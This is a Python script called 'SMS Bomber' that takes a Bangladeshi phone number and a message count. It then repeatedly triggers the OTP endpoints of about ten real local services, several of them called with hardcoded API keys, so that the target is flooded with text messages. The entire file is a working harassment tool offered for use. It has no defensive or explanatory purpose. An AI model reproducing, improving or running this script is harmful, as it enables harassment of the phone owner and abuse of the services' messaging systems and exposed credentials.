import requests
from requests.structures import CaseInsensitiveDict
import random
import os
import json

total_sent=0
success=0
failed=0

banner_colors=["\033[1;31m","\033[1;32m","\033[1;34m"]
reset_color="\033[0m"
black="\033[1;30m" 
red="\033[1;31m"   
green="\033[1;32m" 
yellow="\033[1;33m"
blue="\033[1;34m"  
purple="\033[1;35m"
cyan="\033[1;36m"  
white="\033[1;37m" 

def banner():
	os.system('clear')
	logo=[
	'                                                            ',
	r'$$$$$$$\                          $$\             $$\   $$\ ',
	r'$$  __$$\                         $$ |            $$ |  $$ |',
	r'$$ |  $$ | $$$$$$\  $$$$$$\$$$$\  $$$$$$$\        \$$\ $$  |',
	r'$$$$$$$\ |$$  __$$\ $$  _$$  _$$\ $$  __$$\        \$$$$  / ',
	r'$$  __$$\ $$ /  $$ |$$ / $$ / $$ |$$ |  $$ |       $$  $$<  ',
	r'$$ |  $$ |$$ |  $$ |$$ | $$ | $$ |$$ |  $$ |      $$  /\$$\ ',
	r'$$$$$$$  |\$$$$$$  |$$ | $$ | $$ |$$$$$$$  |      $$ /  $$ |',
	r'\_______/  \______/ \__| \__| \__|\_______/       \__|  \__|',
	'                                                             ']
	for i in logo:
		print(random.choice(banner_colors),i)
	print(f'     {blue}Developer: {green}S M Shahriar Zarir {white}| {blue}Country: {green}Bangladesh     ')
	print('')

def update():
	banner()
	print(blue,'SMS Bomber is running...'.center(62,' '))
	print()
	print(blue,f'Total Sent :  {total_sent}  OTP'.center(60,' '))
	print(green,f'Success    :  {success}  OTP'.center(60,' '))
	print(red,f'Failed     :  {failed}  OTP'.center(60,' '))
	print()
	print(black,'Press Ctrl + C to Exit...'.center(63,' '))

def hoichoi(num):
	global total_sent,success,failed

	url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
	headers = CaseInsensitiveDict()
	headers["x-api-key"] = "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
	headers["Content-Type"] = "application/json"
	data = '{"requestType":"send","phoneNumber":"+88'+num+'"}'
	resp = requests.post(url, headers=headers, data=data)
	total_sent+=1
	if resp.status_code==200:
		success+=1
		update()
		return
	failed+=1
	update()

def bioscope(num):
	global total_sent,success,failed

	url = "https://stage.bioscopelive.com/en/login/send-otp?phone=88"+num+"&operator=bd-otp"
	resp = requests.get(url)
	total_sent+=1
	if resp.status_code==200:
		success+=1
		update()
		return
	failed+=1
	update()

def fundesh_send(num):
	global total_sent,success,failed

	url = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
	headers = CaseInsensitiveDict()
	headers["Content-Type"] = "application/json"
	data = '{"msisdn":"'+num[1:]+'"}'
	resp = requests.post(url, headers=headers, data=data)
	total_sent+=1
	if json.loads(resp.text).get('status')=='OTP_SENT_SUCCESS':
		success+=1
		update()
		return
	failed+=1
	update()

def fundesh_resend(num):
	global total_sent,success,failed

	url = "https://fundesh.com.bd/api/auth/resendOTP"
	headers = CaseInsensitiveDict()
	headers["Content-Type"] = "application/json"
	data = '{"msisdn": "'+num[1:]+'"}'
	resp = requests.post(url, headers=headers, data=data)
	total_sent+=1
	if json.loads(resp.text).get('status')=='OTP_RESEND_SUCCESS':
		success+=1
		update()
		return
	failed+=1
	update()

def swap(num):
	global total_sent,success,failed

	url = "https://prodapi.swap.com.bd/api/v1/send-otp/login"
	headers = CaseInsensitiveDict()
	headers["x-authorization"] = "QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3"
	headers["Content-Type"] = "application/json"
	data = '{"mobile_number":"'+num+'","referral":false}'
	resp = requests.post(url, headers=headers, data=data)
	total_sent+=1
	if json.loads(resp.text).get('success')==True:
		success+=1
		update()
		return
	failed+=1
	update()

def shwapno(num):
	global total_sent,success,failed

	url = "https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO="+num+"&countryPhoneCode=%2B88"
	resp = requests.get(url)
	total_sent+=1
	if 'is sent to your mobile number' in resp.text:
		success+=1
		update()
		return
	failed+=1
	update()

def binge(num):
	global total_sent,success,failed

	url = "https://ss.binge.buzz/otp/send/login"
	headers = CaseInsensitiveDict()
	headers["Content-Type"] = "application/x-www-form-urlencoded"
	data = "phone="+num
	resp = requests.post(url, headers=headers, data=data)
	total_sent+=1
	if json.loads(resp.text).get('is_success')==True:
		success+=1
		update()
		return
	failed+=1
	update()

def ms10(num):
	global total_sent,success,failed

	url = "https://api.10minuteschool.com/lms-auth-service/api/v4/auth/userExists"
	headers = CaseInsensitiveDict()
	headers["Content-Type"] = "application/json"
	data = '{"contact":"+88'+num+'","type":"phone"}'
	resp = requests.post(url, headers=headers, data=data)
	total_sent+=1
	if json.loads(resp.text).get('status')==200:
		success+=1
		update()
		return
	failed+=1
	update()

def bingobd(num):
	global total_sent,success,failed

	url = "https://api.bongo-solutions.com/auth/api/login/send-otp"
	headers = CaseInsensitiveDict()
	headers["Content-Type"] = "application/json"
	data = '{"operator":"all","msisdn":"88'+num+'"}'
	resp = requests.post(url, headers=headers, data=data)
	total_sent+=1
	if resp.status_code==200:
		success+=1
		update()
		return
	failed+=1
	update()

def quizgiri_send(num):
	global total_sent,success,failed

	url = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
	headers = CaseInsensitiveDict()
	headers["Content-Type"] = "application/json"
	data = '{"phone":"'+num+'","country_code":"+880","fcm_token":null}'
	resp = requests.post(url, headers=headers, data=data)
	total_sent+=1
	if json.loads(resp.text).get('success')==True:
		success+=1
		update()
		return
	failed+=1
	update()


def quizgiri_resend(num):
	global total_sent,success,failed

	url = "https://developer.quizgiri.xyz/api/v2.0/retry-otp"
	headers = CaseInsensitiveDict()
	headers["Content-Type"] = "application/json"
	data = '{"phone":"'+num+'","country_code":"+880"}'
	resp = requests.post(url, headers=headers, data=data)
	total_sent+=1
	if json.loads(resp.text).get('success')==True:
		success+=1
		update()
		return
	failed+=1
	update()

def goodbye():
	banner()
	print(blue,f'Total Sent :  {total_sent}  OTP'.center(60,' '))
	print(green,f'Success    :  {success}  OTP'.center(60,' '))
	print(red,f'Failed     :  {failed}  OTP'.center(60,' '))
	print()
	print(green,'Thanks for using my tool.'.center(62,' '))
	exit()


try:
	banner()
	number=str(input(f'{blue} [*] Enter mobile number (without +88): '))
	if len(number)<11 or len(number)>11:
		print(f'\n{red} [*] Please enter a valid number. Eg: 01919472855')
		exit()
	try:
		amount=int(input(f'{green} [*] Enter amount of sms: '))
	except ValueError:
		print(f'\n{red} [*] Please enter only numbers, not letter!')
		exit()
except KeyboardInterrupt:
	exit()
except Exception as e:
	print(red,e)
	exit()


while True:
	try:
		update()
		if not success<=amount-1:
			goodbye()
		hoichoi(number)#=======================
		if not success<=amount-1:
			goodbye()
		bioscope(number)
		if not success<=amount-1:
			goodbye()
		fundesh_send(number)
		if not success<=amount-1:
			goodbye()
		fundesh_resend(number)
		if not success<=amount-1:
			goodbye()
		swap(number)
		if not success<=amount-1:
			goodbye()
		shwapno(number)
		if not success<=amount-1:
			goodbye()
		binge(number)
		if not success<=amount-1:
			goodbye()
		ms10(number)
		if not success<=amount-1:
			goodbye()
		bingobd(number)
		if not success<=amount-1:
			goodbye()
		quizgiri_send(number)
		if not success<=amount-1:
			goodbye()
		quizgiri_resend(number)
		if not success<=amount-1:
			goodbye()

	except KeyboardInterrupt:
		banner()
		print(blue,f'Total Sent :  {total_sent}  OTP'.center(60,' '))
		print(green,f'Success    :  {success}  OTP'.center(60,' '))
		print(red,f'Failed     :  {failed}  OTP'.center(60,' '))
		print()
		print(green,'Thanks for using my tool.'.center(62,' '))
		exit()
	except requests.exceptions.ConnectionError:
		print(f'\n{red} [*] Something went wrong! Please make sure you are connected with internet')
		exit()
	except Exception as e:
		print(red,e)
		exit()
input(" [-] Enter To Exit")
